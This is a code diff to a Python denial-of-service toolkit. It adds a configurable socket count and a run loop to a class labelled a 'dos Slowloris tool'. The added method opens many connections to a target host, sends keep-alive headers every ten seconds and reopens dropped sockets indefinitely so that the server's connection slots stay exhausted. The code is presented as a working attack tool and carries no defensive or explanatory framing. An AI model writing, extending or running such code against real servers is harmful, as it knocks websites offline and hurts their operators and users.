@@ -235,11 +235,12 @@ class Hammer:
 class Slowloris:
     """dos Slowloris tool"""
     
-    def __init__(self, host_target: str, port_target: int = 80, it_is_https: bool = False):
+    def __init__(self, host_target: str, port_target: int = 80, it_is_https: bool = False, socket_count: int = 100):
         
         self.host = host_target
         self.port = port_target
         self.is_https = it_is_https
+        self.socket_count = socket_count
     
     def create_socket(self) -> socket.socket:
         """create a socket for us"""
@@ -278,6 +279,47 @@ class Slowloris:
         
         packet = f"Accept-language: {DefaultHttpParameters.Headers.accept_language}\r\n"
         return packet.encode("utf-8")
+
+    def run(self):
+        """Run"""
+        
+        list_of_sockets = []
+        
+        print(FontColors.yellow("Slowloris Is Here :) "), FontColors.green("Creating sockets..."))
+        
+        for _ in range(self.socket_count):
+            try:
+                a_socket = self.create_socket()
+            except socket.error:
+                break
+            list_of_sockets.append(a_socket)
+        
+        while True:
+            try:
+                
+                print(FontColors.blue(time.ctime()), \
+                FontColors.green(f"Sending keep-alive headers... Socket count: {len(list_of_sockets)}"))
+                
+                for s in list(list_of_sockets):
+                    try:
+                        s.send(self.create_xa_header())
+                    except socket.error:
+                        list_of_sockets.remove(s)
+                
+                for _ in range(self.socket_count - len(list_of_sockets)):
+                    print(FontColors.yellow("Recreating sockets..."))
+                    try:
+                        a_socket = self.create_socket()
+                        if a_socket:
+                            list_of_sockets.append(a_socket)
+                    except socket.error:
+                        break
+
+                time.sleep(10)
+                    
+            except (KeyboardInterrupt, SystemExit):
+                print(FontColors.blue(time.ctime()), FontColors.yellow("Stopping Slowloris!"))
+                sys.exit(0)
 
     def create_xa_header(self) -> bytes:
         """return the header for X-a"""
